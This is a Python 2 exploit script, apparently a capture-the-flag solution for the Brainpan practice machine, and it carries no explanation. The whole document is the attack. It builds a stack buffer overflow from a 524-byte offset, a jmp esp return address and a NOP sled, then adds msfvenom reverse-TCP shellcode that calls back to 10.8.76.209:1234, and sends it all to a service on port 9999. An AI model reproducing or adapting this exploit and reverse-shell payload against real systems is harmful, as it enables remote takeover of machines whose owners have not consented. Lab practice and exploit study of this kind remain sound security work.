#brainpan

import socket
import sys

buff = "A" * 524		#offset

buff += "\xf3\x12\x17\x31"	#jmp esp

buff += "\x90" * 16		#NOP Slides

#msfvenom -p windows/shell_reverse_tcp lhost=10.8.76.209 lport=1234 -a x86 -f python -b "\x00"
#buf =  b""
buff += b"\xbb\x73\xe7\x52\xec\xdb\xc5\xd9\x74\x24\xf4\x5a\x31"
buff += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x99\x1b\xb0"
buff += b"\x19\xa1\x0c\xb7\xe2\x59\xcd\xd8\x6b\xbc\xfc\xd8\x08"
buff += b"\xb5\xaf\xe8\x5b\x9b\x43\x82\x0e\x0f\xd7\xe6\x86\x20"
buff += b"\x50\x4c\xf1\x0f\x61\xfd\xc1\x0e\xe1\xfc\x15\xf0\xd8"
buff += b"\xce\x6b\xf1\x1d\x32\x81\xa3\xf6\x38\x34\x53\x72\x74"
buff += b"\x85\xd8\xc8\x98\x8d\x3d\x98\x9b\xbc\x90\x92\xc5\x1e"
buff += b"\x13\x76\x7e\x17\x0b\x9b\xbb\xe1\xa0\x6f\x37\xf0\x60"
buff += b"\xbe\xb8\x5f\x4d\x0e\x4b\xa1\x8a\xa9\xb4\xd4\xe2\xc9"
buff += b"\x49\xef\x31\xb3\x95\x7a\xa1\x13\x5d\xdc\x0d\xa5\xb2"
buff += b"\xbb\xc6\xa9\x7f\xcf\x80\xad\x7e\x1c\xbb\xca\x0b\xa3"
buff += b"\x6b\x5b\x4f\x80\xaf\x07\x0b\xa9\xf6\xed\xfa\xd6\xe8"
buff += b"\x4d\xa2\x72\x63\x63\xb7\x0e\x2e\xec\x74\x23\xd0\xec"
buff += b"\x12\x34\xa3\xde\xbd\xee\x2b\x53\x35\x29\xac\x94\x6c"
buff += b"\x8d\x22\x6b\x8f\xee\x6b\xa8\xdb\xbe\x03\x19\x64\x55"
buff += b"\xd3\xa6\xb1\xfa\x83\x08\x6a\xbb\x73\xe9\xda\x53\x99"
buff += b"\xe6\x05\x43\xa2\x2c\x2e\xee\x59\xa7\x5b\xe7\x2d\xe6"
buff += b"\x34\xf5\xad\x0c\x17\x70\x4b\x66\x87\xd5\xc4\x1f\x3e"
buff += b"\x7c\x9e\xbe\xbf\xaa\xdb\x81\x34\x59\x1c\x4f\xbd\x14"
buff += b"\x0e\x38\x4d\x63\x6c\xef\x52\x59\x18\x73\xc0\x06\xd8"
buff += b"\xfa\xf9\x90\x8f\xab\xcc\xe8\x45\x46\x76\x43\x7b\x9b"
buff += b"\xee\xac\x3f\x40\xd3\x33\xbe\x05\x6f\x10\xd0\xd3\x70"
buff += b"\x1c\x84\x8b\x26\xca\x72\x6a\x91\xbc\x2c\x24\x4e\x17"
buff += b"\xb8\xb1\xbc\xa8\xbe\xbd\xe8\x5e\x5e\x0f\x45\x27\x61"
buff += b"\xa0\x01\xaf\x1a\xdc\xb1\x50\xf1\x64\xc1\x1a\x5b\xcc"
buff += b"\x4a\xc3\x0e\x4c\x17\xf4\xe5\x93\x2e\x77\x0f\x6c\xd5"
buff += b"\x67\x7a\x69\x91\x2f\x97\x03\x8a\xc5\x97\xb0\xab\xcf"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
        s.connect(('10.10.39.245', 9999))

except:
        print "Error"
        sys.exit(0)
s.recv(1024)
s.send(buff)
